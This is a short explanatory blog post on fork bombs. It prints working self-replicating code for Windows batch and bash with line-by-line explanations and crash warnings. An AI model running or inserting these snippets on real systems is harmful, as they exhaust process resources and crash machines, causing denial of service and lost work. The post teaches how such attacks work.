---
title: Fork Bombs
date: "2009-03-27 11:21:00 -0700"
category: Programming
blog_tags: Hacks Linux Programming Windows Windows-Advanced Windows-Basic
---
<span style="font-size:x-large;color:red">***_WARNING: Trying some of these can crash your system!_***</span>

I'll explain a fork bomb to you <mark>in simple words:</mark>

> A fork bomb <mark>duplicates itself</mark>, eventually killing and shutting the system down by <mark>overload</mark>ing it.

Here are some explained examples:

<!--more-->

# Windows / Batch

```bat
REM Runs self twice and close
%0|%0
```

## Human Readable Code:


> Bomb|Bomb  
> Remove this bomb (end of execution).

## Better Batch Fork Bomb:

```bat
:s
start %0
%0|%0
goto :s
```

### Explanation

> Start 3 instances of self and repeat

### Human Readable:

> _Marker S_  
> Bomb  
> Bomb|Bomb  
> Go to _Marker S_.

# Unix Bash Code:

```bash
:(){:|:&};:
```

## Reformated as:

```bash
:(){ # bomb(){
:|:& # bomb, bomb, and keep both of these in memory
};   # }
:    # execute bomb()
```

***_<span style="font-size:medium">I hope you <mark>don't try any of these on your system</mark>, unless you want it to crash!</span>_***
